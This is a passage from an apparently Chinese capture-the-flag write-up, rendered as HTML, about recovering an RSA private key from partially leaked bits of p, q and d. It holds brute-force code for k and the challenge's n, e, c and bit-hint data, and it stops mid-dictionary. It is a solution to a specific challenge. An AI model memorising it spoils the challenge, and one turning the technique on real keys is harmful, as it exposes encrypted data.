class="title function_">getnum</span>(<span class="params">hint, bit</span>):</span><br><span class="line">        s = [<span class="string">&#x27;?&#x27;</span>] * bit</span><br><span class="line">        <span class="keyword">for</span> tmp <span class="keyword">in</span> hint.items():</span><br><span class="line">            s[tmp[<span class="number">0</span>]] = tmp[<span class="number">1</span>]</span><br><span class="line">        ss = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> ss.join(s)</span><br><span class="line"></span><br><span class="line">    p_corr = getnum(hint1, <span class="number">512</span>)</span><br><span class="line">    q_corr = getnum(hint2, <span class="number">512</span>)</span><br><span class="line">    d_corr = getnum(hint3, <span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">return</span> n, e, c, p_corr, q_corr, d_corr, hint3</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">args</span>):</span><br><span class="line">    <span class="comment"># fn: 函数参数是数据列表的一个元素</span></span><br><span class="line">    N, e, c, p_corr, q_corr, d_corr, hint_d = get_params_prob()</span><br><span class="line">    MY_SIZE = <span class="number">508</span></span><br><span class="line">    my_hint_d = &#123;x: y <span class="keyword">for</span> x, y <span class="keyword">in</span> hint_d.items() <span class="keyword">if</span> x &lt; MY_SIZE&#125;</span><br><span class="line">    l, r = args</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">max</span>(<span class="number">1</span>, l), <span class="built_in">min</span>(e, r)):</span><br><span class="line">        d_tilde = (k*(N+<span class="number">1</span>)+<span class="number">1</span>) // e</span><br><span class="line">        d_tilde_str = <span class="built_in">bin</span>(d_tilde)[<span class="number">2</span>:].zfill(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">for</span> x, y <span class="keyword">in</span> my_hint_d.items():</span><br><span class="line">            <span class="keyword">if</span> (d_tilde_str[x] != y):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;FIND ANS:&#x27;</span>, k)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    <span class="comment"># print(f&#x27;Find &#123;(l, r)&#125; failed&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    testX = [(<span class="number">2</span>**<span class="number">24</span>*i, <span class="number">2</span>**<span class="number">24</span>*(i+<span class="number">1</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;concurrent:&#x27;</span>)  <span class="comment"># 创建多个进程，并行执行</span></span><br><span class="line">    pool = Pool(<span class="number">256</span>)  <span class="comment"># 创建拥有3个进程数量的进程池</span></span><br><span class="line">    </span><br><span class="line">    pool.<span class="built_in">map</span>(run, testX)</span><br><span class="line">    pool.close()  <span class="comment"># 关闭进程池，不再接受新的进程</span></span><br><span class="line">    pool.join()  <span class="comment"># 主进程阻塞等待子进程的退出</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>拿到k以后爆破pq，直接用春哥的代码</p><p>https://zhuanlan.zhihu.com/p/266059082 ，四元变三元，也很吃算力</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">n = <span class="number">73380160475470842653695210816683702314062827937540324056880543809752271506601290265975543542548117392788987830919581511428492717214125296973338501980504384307279414528799452106399062576988406269897425829853390463840834798274139351938197666753546672052277640048588091137812362810008344723302886421059831149393</span></span><br><span class="line">e = <span class="number">3116872133</span></span><br><span class="line">c = <span class="number">69574121902821459446683688068339366486115223765903849266663001038736496551168104587683366853482649748413400537793260948337629422998336301256862519087984048032673577462034223842650399943613576577927825123830629917138007035313624847266208032195071033675853881447717750353382112841885318776240405314057286867952</span></span><br><span class="line">hint1 = &#123;<span class="number">120</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">401</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">58</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">420</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">192</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">164</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">100</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">425</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">227</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">497</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">284</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">110</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">257</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">31</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">68</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">2</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">206</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">174</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">326</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">320</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">498</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">50</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">7</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">128</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">54</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">15</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">222</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">166</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">496</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">151</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">317</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">449</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">181</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">288</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">311</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">80</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">69</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">410</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">127</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">308</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">39</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">435</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">258</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">235</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">94</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">93</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">412</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">427</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">352</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">123</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">25</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">316</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">3</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">88</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">390</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">72</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">450</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">397</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">309</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">487</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">207</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">234</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">144</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">229</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">48</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">506</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">253</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">86</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">384</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">428</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">359</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">104</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">339</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">142</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">452</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">480</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">224</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">310</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">98</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">508</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">133</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">90</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">170</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">146</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">101</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">416</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">460</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">387</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">67</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">285</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">213</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">162</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">14</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">485</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">413</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">312</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">458</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">75</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">242</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">177</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">30</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">501</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">434</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">456</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">264</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">407</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">135</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">84</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">476</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">471</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">430</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">191</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">176</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">29</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">156</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">26</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">322</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">388</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">364</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">321</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">351</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">230</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">345</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">432</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">36</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">296</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">79</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">23</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">290</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">117</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">507</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">421</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">274</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">6</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">327</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">204</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">383</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">305</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">113</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">334</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">85</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">511</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">464</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">491</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">370</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">92</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">495</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">279</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">346</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">16</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">44</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">24</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">466</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">87</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">243</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">461</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">379</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">256</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">473</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">17</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">276</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">147</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">187</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">112</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">218</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">78</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">411</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">343</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">10</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">271</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">378</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">492</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">269</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">291</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">289</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">132</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">9</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">408</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">398</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">468</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">124</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">236</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">377</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">83</span>: <span class="string">&#x27;0&#x27;</span>&#125;</span><br><span class="line">hint2 = &#123;<span class="number">125</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">86</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">8</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">498</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">311</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">93</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">385</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">315</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">300</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">454</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">152</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">205</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">400</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">348</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">18</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">154</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">51</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">435</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">25</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">430</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">72</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">136</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">294</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">466</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">388</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">428</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">440</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">250</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">506</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">48</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">270</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">318</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">107</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">327</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">474</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">325</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">281</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">392</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">473</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">13</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">90</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">278</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">425</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">109</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">423</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">412</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">190</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">171</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">475</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">441</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">336</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">371</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">323</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">22</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">469</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">451</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">438</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">203</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">121</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">52</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">494</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">399</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">314</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">24</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">183</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">492</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">246</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">108</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">379</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">460</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">56</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">372</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">313</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">44</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">237</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">12</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">6</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">204</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">80</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">339</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">296</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">483</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">402</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">67</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">338</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">116</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">406</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">218</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">115</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">301</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">490</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">502</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">343</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">46</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">321</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">231</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">88</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">404</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">426</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">344</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">123</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">463</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">45</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">461</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">1</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">229</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">28</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">274</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">134</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">104</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">21</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">256</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">471</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">157</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">217</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">158</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">307</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">26</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">255</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">386</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">373</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">114</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">360</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">148</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">383</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">63</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">19</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">472</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">201</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">262</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">47</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">221</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">310</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">352</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">224</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">185</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">214</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">285</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">410</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">455</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">445</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">464</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">284</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">503</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">298</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">449</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">477</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">376</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">16</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">133</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">177</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">210</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">364</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">163</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">213</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">295</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">111</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">458</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">146</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">244</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">261</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">508</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">106</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">112</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">120</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">156</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">303</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">259</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">35</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">444</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">215</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">304</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">140</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">351</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">443</span>: <span class="string">&#x27;0&#x27;</span>&#125;</span><br><span class="line">hint3 = &#123;<span class="number">891</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">74</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">129</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">477</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">880</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">57</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">473</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">289</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">361</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">1012</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">529</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">294</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">174</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">500</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">257</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">392</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">405</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">11</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">763</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">637</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">564</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">941</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">923</span>: <span 